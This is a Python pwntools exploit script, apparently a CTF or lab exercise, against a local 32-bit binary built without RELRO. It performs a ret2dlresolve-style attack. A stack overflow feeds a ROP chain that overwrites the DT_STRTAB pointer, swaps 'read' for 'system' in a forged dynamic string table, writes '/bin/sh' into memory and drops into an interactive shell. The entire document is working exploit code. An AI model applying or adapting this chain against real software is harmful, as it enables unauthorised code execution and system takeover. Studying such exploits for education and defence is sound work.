#!/usr/bin/env python3
from pwn import *
context.log_level = 'DEBUG'
context.arch = "i386"

sh = process("./main_no_relro_32")
rop = ROP("./main_no_relro_32")
elf = ELF("./main_no_relro_32")

sh.recv()

offset = 0x6c + 4

rop.raw('a'*offset)

# read addr to replace dt_strtab addr
rop.read(0, 0x08049804 + 4, 4)

dtstrtab = elf.get_section_by_name('.dynstr').data()
dtstrtab = dtstrtab.replace(b"read", b"system")

# read new strtab
rop.read(0, 0x080498E0, len((dtstrtab)))

rop.read(0, 0x080498E0+0x100, len("/bin/sh\x00"))

# ret read plt --- system
rop.raw(0x08048376)
rop.raw(0xdeadbeef)
rop.raw(0x080498E0 + 0x100)
rop.dump()

sh.send(rop.chain())

sh.send(p32(0x080498E0))
sh.send(dtstrtab)
sh.send("/bin/sh\x00")
sh.interactive()
